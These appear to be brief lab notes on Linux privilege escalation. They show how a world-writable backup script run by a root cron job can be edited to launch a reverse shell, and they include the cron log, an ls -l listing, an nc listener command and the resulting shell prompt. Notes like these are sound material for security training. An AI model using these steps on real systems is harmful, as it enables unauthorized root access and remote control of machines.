May  1 01:21:01 debian-privesc CRON[1387]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
...

# It appears that a script called user_backups.sh under /home/joe
#!/bin/bash
cp -rf /home/joe/ /var/backups/joe/

# The script is pretty straight-forward and it just simply copies the user's home directory to the backup subdirectory.
# We can see the script is writeable by ls -l
-rwxrwxrw- 1 root root 50 Aug 25  2022 user_backups.sh

# since an unprivileged user can modify the contents of the backup script, we can edit it and add a reverse-shell one liner
nano .scripts/user_backups.sh
# Paste the code from bash-revsh.sh Options 4

# On kali machine
nc -lvnp 6666
# Then wait for cronjob run
/bin/sh: 0: can't access tty; job control turned off
# ls
